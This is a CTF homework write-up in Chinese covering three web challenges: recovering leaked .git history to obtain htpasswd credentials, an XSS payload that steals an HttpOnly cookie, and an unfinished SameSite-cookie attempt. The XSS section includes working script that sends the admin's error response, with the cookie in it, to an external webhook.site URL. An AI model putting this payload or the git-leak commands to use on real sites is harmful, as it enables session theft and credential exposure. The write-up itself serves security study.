###### tags: `ctf`
# Hw4 write_up

## ID
bruce30709
## The Stupid Content Tracker
本題主要的問題是git洩漏了資訊，所以先照著投影片的提示，用githack得出後端的directory架構。
![](https://i.imgur.com/dCDpMiA.png)
接著用dirserach再掃一次
![](https://i.imgur.com/2l1EZXK.png)
可以看出在logs/refs/heads/master內洩漏了git的commitid
![](https://i.imgur.com/9A6uyji.png)
所以就利用http-fetch到我們的網站，輸入我們得到的commitid，並對照著查看，即可看到洩露的htpasswd內容。
```
git init
git http-fetch -a 51d768c7d3eb3ea8104c2a76598b95702f4724a3 
https://edu-ctf.csie.org:44302/.git/
git checkout 51d768c7d3eb3ea8104c2a76598b95702f4724a3
git log -p
```
![](https://i.imgur.com/3MdrRi7.png)

最後照著使用者名稱和密碼登入後，即可在admin_portal_non_production/index.php得到flag~
![](https://i.imgur.com/gzl0YEu.png)



## Zero Note Revenge
本題是使用跟lab相同的方式，但因為是httponly的cookie，所以不會被js的document.cookie讀取到，故要先讓admin去點錯誤的note，這時候後端server的error就會有httponly的cookie出現在response中，最後只要把得到的response，再回傳回自己的webhook，即可拿到httponly的cookie。

在zero note中插入以下程式碼
![](https://i.imgur.com/c6zyDjw.png)

我是使用XHR的方法來傳送request。

```javascript=
<script>
var url = 'https://zero-note.edu-ctf.bookgin.tw:44301/note/aaa'; 

function load(url, callback) {
  var xhr = new XMLHttpRequest();
  var xhr1 = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
		xhr1.open('POST',
        'https://webhook.site/5ce3641e-7136-40aa-967e-04415d0a77c4',true);
		xhr1.withCredentials = true;
		xhr1.send(xhr.response);
    }
  }

  xhr.open('GET', url, true);
  xhr.withCredentials = true;
  xhr.send('');
  
}
var a
load(url,a);

</script>
```
就可以得拿到flag了~

![](https://i.imgur.com/GyjgftE.png)

## Zero Meme

本題的cookie被加上了samesite的tag，其用意是要確保是在同源的網站，才能收到cookie，本題首先要解決XSS不能在server端的問題，有試過很多方法，但都沒能成功，只成功送出request並能夠讓admin在server端去點我們的連結，並收到來自server的response但可惜沒資訊，因為沒插入XSS拿cookie。

這是我嘗試的方法，經過測試是只有value attribute會點，而onfocus的fetch並不會執行。
![](https://i.imgur.com/T21brLz.png)
再送出form post
![](https://i.imgur.com/3PjKrCN.png)
只能得到空的回應
![](https://i.imgur.com/cTpwh9c.png)

只做到這裡，想不到解法。





